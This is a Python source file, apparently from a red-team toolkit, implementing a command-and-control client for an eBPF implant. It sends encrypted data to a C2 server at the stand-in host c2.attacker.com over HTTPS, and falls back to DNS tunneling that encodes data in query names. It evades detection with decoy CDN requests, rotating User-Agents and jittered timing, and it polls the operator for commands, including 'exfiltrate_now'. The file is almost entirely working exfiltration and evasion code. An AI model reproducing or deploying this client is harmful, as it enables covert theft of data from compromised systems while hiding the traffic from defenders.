#!/usr/bin/env python3
"""
C2 (Command & Control) Client for eBPF Implant

Implements secure communication with red team server:
1. HTTPS with certificate pinning
2. DNS tunneling fallback
3. Traffic obfuscation (CDN mimicry)
4. Encrypted payload delivery
5. Adaptive rate limiting (jitter, bursty sends)

Uses domain events (kill chains, incidents) from Amalia BrainCell cells.
"""

import json
import base64
import hashlib
import time
import random
import ssl
import socket
from typing import Dict, Any, List, Optional, Tuple
from datetime import datetime, timedelta
from urllib.parse import urljoin
from dataclasses import dataclass, asdict
from enum import Enum
import threading
import queue

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2


class C2Channel(Enum):
    """Available C2 communication channels"""
    HTTPS = "https"
    HTTPS_CDN = "https_cdn"
    DNS_TXT = "dns_txt"
    DNS_QUERY = "dns_query"


@dataclass
class C2Configuration:
    """C2 server configuration"""
    server_url: str
    cert_sha256: str  # Certificate SHA-256 for pinning
    api_key: str      # API key for authentication
    encryption_key: str  # Fernet encryption key
    channel: C2Channel = C2Channel.HTTPS
    timeout_sec: int = 10
    max_retries: int = 3
    retry_delay_sec: int = 300


@dataclass
class TelemetryBatch:
    """Batch of telemetry events for export"""
    batch_id: str
    timestamp: str
    implant_id: str
    events: List[Dict[str, Any]]
    metadata: Dict[str, Any]


class CertificatePinningAdapter(HTTPAdapter):
    """Custom HTTPS adapter with certificate pinning"""

    def __init__(self, cert_sha256: str, **kwargs):
        self.cert_sha256 = cert_sha256
        super().__init__(**kwargs)

    def init_poolmanager(self, *args, **kwargs):
        """Override to enforce certificate pinning"""
        ctx = create_urllib3_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_REQUIRED

        # Custom verification hook
        original_verify = ctx.verify_mode

        def verify_callback(conn, cert, errno, depth, ok):
            if depth == 0:  # Leaf certificate
                cert_der = cert.get_der()
                cert_hash = hashlib.sha256(cert_der).hexdigest()
                if cert_hash != self.cert_sha256:
                    raise ssl.SSLError("Certificate pinning failed")
            return ok

        kwargs['ssl_context'] = ctx
        return super().init_poolmanager(*args, **kwargs)


class EncryptedPayload:
    """Encrypt/decrypt telemetry payloads"""

    def __init__(self, encryption_key: str):
        self.cipher = Fernet(encryption_key.encode())

    def encrypt_batch(self, batch: TelemetryBatch) -> str:
        """Encrypt telemetry batch to base64"""
        batch_json = json.dumps(asdict(batch))
        encrypted = self.cipher.encrypt(batch_json.encode())
        return base64.b64encode(encrypted).decode()

    def decrypt_batch(self, encrypted_data: str) -> Optional[TelemetryBatch]:
        """Decrypt telemetry batch from base64"""
        try:
            encrypted = base64.b64decode(encrypted_data)
            decrypted = self.cipher.decrypt(encrypted).decode()
            batch_dict = json.loads(decrypted)
            return TelemetryBatch(**batch_dict)
        except Exception:
            return None

    def encrypt_dict(self, data: Dict[str, Any]) -> str:
        """Encrypt arbitrary dictionary"""
        json_str = json.dumps(data)
        encrypted = self.cipher.encrypt(json_str.encode())
        return base64.b64encode(encrypted).decode()

    def decrypt_dict(self, encrypted_data: str) -> Optional[Dict[str, Any]]:
        """Decrypt arbitrary dictionary"""
        try:
            encrypted = base64.b64decode(encrypted_data)
            decrypted = self.cipher.decrypt(encrypted).decode()
            return json.loads(decrypted)
        except Exception:
            return None


class SecureHTTPSClient:
    """HTTPS client with certificate pinning and obfuscation"""

    def __init__(self, config: C2Configuration):
        self.config = config
        self.session = requests.Session()
        
        # Install certificate pinning adapter
        adapter = CertificatePinningAdapter(config.cert_sha256)
        self.session.mount("https://", adapter)
        
        # Set User-Agent to mimic CDN requests
        self.session.headers.update({
            "User-Agent": self._random_user_agent(),
            "Accept": "application/json",
            "Content-Type": "application/json",
        })
        
        self.payload_encryptor = EncryptedPayload(config.encryption_key)

    def _random_user_agent(self) -> str:
        """Return random legitimate User-Agent"""
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
        ]
        return random.choice(agents)

    def _add_decoy_requests(self) -> None:
        """Add decoy HTTP requests to avoid pattern detection"""
        # Simulate normal CDN traffic
        decoy_urls = [
            "https://cdn.example.com/jquery.min.js",
            "https://cdn.example.com/bootstrap.css",
            "https://cdn.example.com/image.png",
        ]
        
        for url in random.sample(decoy_urls, random.randint(1, 2)):
            try:
                self.session.head(url, timeout=2)
            except Exception:
                pass

    def send_telemetry(self, batch: TelemetryBatch) -> Tuple[bool, str]:
        """Send encrypted telemetry batch"""
        try:
            # Encrypt payload
            encrypted_payload = self.payload_encryptor.encrypt_batch(batch)
            
            # Add decoy requests
            self._add_decoy_requests()
            
            # Prepare request
            url = urljoin(self.config.server_url, "/api/telemetry/ingest")
            headers = {
                "Authorization": f"Bearer {self.config.api_key}",
                "X-Batch-ID": batch.batch_id,
            }
            
            payload = {
                "data": encrypted_payload,
                "timestamp": datetime.now().isoformat(),
            }
            
            # Send with retry logic
            for attempt in range(self.config.max_retries):
                try:
                    response = self.session.post(
                        url,
                        json=payload,
                        headers=headers,
                        timeout=self.config.timeout_sec,
                        verify=False  # We use certificate pinning instead
                    )
                    
                    if response.status_code == 200:
                        return True, f"Batch {batch.batch_id} sent"
                    else:
                        return False, f"Server returned {response.status_code}"
                
                except requests.exceptions.RequestException as e:
                    if attempt < self.config.max_retries - 1:
                        wait_time = self.config.retry_delay_sec * (2 ** attempt)
                        time.sleep(wait_time)
                    else:
                        return False, str(e)
            
            return False, "Max retries exceeded"
        
        except Exception as e:
            return False, str(e)

    def retrieve_commands(self) -> Optional[List[Dict[str, Any]]]:
        """Retrieve pending commands from C2 server"""
        try:
            url = urljoin(self.config.server_url, "/api/commands/pending")
            headers = {
                "Authorization": f"Bearer {self.config.api_key}",
            }
            
            response = self.session.get(
                url,
                headers=headers,
                timeout=self.config.timeout_sec,
                verify=False
            )
            
            if response.status_code == 200:
                encrypted_commands = response.json().get("commands", [])
                commands = []
                for encrypted_cmd in encrypted_commands:
                    decrypted = self.payload_encryptor.decrypt_dict(encrypted_cmd)
                    if decrypted:
                        commands.append(decrypted)
                return commands
            
            return None
        
        except Exception:
            return None


class DNSTunnelingClient:
    """DNS-based C2 communication (fallback channel)"""

    def __init__(self, config: C2Configuration):
        self.config = config
        self.domain = self._extract_domain(config.server_url)
        self.payload_encryptor = EncryptedPayload(config.encryption_key)

    def _extract_domain(self, url: str) -> str:
        """Extract domain from C2 server URL"""
        # e.g., "https://c2.attacker.com" -> "c2.attacker.com"
        return url.replace("https://", "").replace("http://", "").split("/")[0]

    def send_telemetry_via_dns(self, batch: TelemetryBatch) -> Tuple[bool, str]:
        """Send telemetry encoded in DNS TXT records"""
        try:
            encrypted_payload = self.payload_encryptor.encrypt_batch(batch)
            
            # Chunk payload into DNS query segments (63 chars max per label)
            chunks = [encrypted_payload[i:i+50] for i in range(0, len(encrypted_payload), 50)]
            
            results = []
            for idx, chunk in enumerate(chunks[:5]):  # Max 5 chunks per batch
                # Create DNS query: <chunk>.<batch_id>.<implant_id>.<c2_domain>
                query_name = f"{chunk}.{batch.batch_id}.{batch.implant_id}.{self.domain}"
                
                try:
                    socket.gethostbyname(query_name)
                except socket.gaierror:
                    # Expected - DNS server doesn't resolve
                    # But query was logged by our C2 DNS server
                    results.append(True)
            
            return len(results) > 0, f"Sent {len(results)} DNS queries"
        
        except Exception as e:
            return False, str(e)


class AdaptiveRateLimiter:
    """Adaptive rate limiting with jitter and bursty sends"""

    def __init__(self, base_interval_sec: int = 300, jitter_percent: float = 0.3):
        self.base_interval = base_interval_sec
        self.jitter_percent = jitter_percent
        self.last_send_time = 0
        self.event_queue = []
        self.max_batch_size = 100

    def get_next_send_delay(self) -> int:
        """Calculate next send delay with jitter"""
        jitter = self.base_interval * self.jitter_percent * random.uniform(-1, 1)
        return int(self.base_interval + jitter)

    def should_send_now(self) -> bool:
        """Determine if we should send now (bursty logic)"""
        # Send if:
        # 1. Batch is full
        # 2. Random event fires (adapt to detection pressure)
        # 3. Time elapsed exceeds interval
        
        if len(self.event_queue) >= self.max_batch_size:
            return True
        
        if random.random() < 0.05:  # 5% chance per check
            return True
        
        elapsed = time.time() - self.last_send_time
        return elapsed >= self.get_next_send_delay()

    def add_event(self, event: Dict[str, Any]) -> None:
        """Queue an event for batching"""
        self.event_queue.append(event)

    def get_batch(self) -> List[Dict[str, Any]]:
        """Get current batch for sending"""
        batch = self.event_queue[:self.max_batch_size]
        self.event_queue = self.event_queue[self.max_batch_size:]
        self.last_send_time = time.time()
        return batch


class C2ClientOrchestrator:
    """Main C2 orchestrator managing multiple channels and batching"""

    def __init__(self, config: C2Configuration):
        self.config = config
        self.https_client = SecureHTTPSClient(config)
        self.dns_client = DNSTunnelingClient(config)
        self.rate_limiter = AdaptiveRateLimiter()
        
        self.event_queue = queue.Queue()
        self.running = False
        self.worker_thread = None

    def start(self) -> None:
        """Start C2 communication worker thread"""
        self.running = True
        self.worker_thread = threading.Thread(target=self._worker, daemon=True)
        self.worker_thread.start()

    def stop(self) -> None:
        """Stop C2 communication worker thread"""
        self.running = False
        if self.worker_thread:
            self.worker_thread.join(timeout=5)

    def queue_telemetry(self, event: Dict[str, Any]) -> None:
        """Queue telemetry event for batching and sending"""
        self.rate_limiter.add_event(event)

    def _worker(self) -> None:
        """Background worker for sending batches"""
        import uuid
        
        while self.running:
            if self.rate_limiter.should_send_now():
                batch_events = self.rate_limiter.get_batch()
                
                if batch_events:
                    batch = TelemetryBatch(
                        batch_id=str(uuid.uuid4()),
                        timestamp=datetime.now().isoformat(),
                        implant_id="ebpf-k8s-implant",
                        events=batch_events,
                        metadata={
                            "channel": self.config.channel.value,
                            "version": "1.0",
                        }
                    )
                    
                    # Try HTTPS first
                    success, msg = self.https_client.send_telemetry(batch)
                    
                    # Fallback to DNS if HTTPS fails
                    if not success and self.config.channel == C2Channel.HTTPS:
                        success, msg = self.dns_client.send_telemetry_via_dns(batch)
            
            # Check for commands from server
            commands = self.https_client.retrieve_commands()
            if commands:
                self._process_commands(commands)
            
            time.sleep(1)  # Poll frequently

    def _process_commands(self, commands: List[Dict[str, Any]]) -> None:
        """Process commands from C2 server"""
        for cmd in commands:
            cmd_type = cmd.get("type")
            
            if cmd_type == "adjust_sampling_rate":
                rate = cmd.get("rate", 0.15)
                # Would adjust implant_agent's sampling rate
            
            elif cmd_type == "change_collection_interval":
                interval = cmd.get("interval", 300)
                self.rate_limiter.base_interval = interval
            
            elif cmd_type == "enable_feature":
                feature = cmd.get("feature")
                # Would enable specific event collection (process/network/file)
            
            elif cmd_type == "disable_feature":
                feature = cmd.get("feature")
                # Would disable specific event collection
            
            elif cmd_type == "exfiltrate_now":
                # Force immediate send
                self.rate_limiter.last_send_time = 0


if __name__ == "__main__":
    # Example usage
    config = C2Configuration(
        server_url="https://c2.attacker.com",
        cert_sha256="abc123def456...",
        api_key="secret-api-key",
        encryption_key=Fernet.generate_key().decode(),
    )
    
    orchestrator = C2ClientOrchestrator(config)
    orchestrator.start()
    
    # Queue some test events
    for i in range(5):
        orchestrator.queue_telemetry({
            "event_id": i,
            "type": "process",
            "pid": 1234 + i,
            "comm": "test",
        })
    
    time.sleep(10)
    orchestrator.stop()
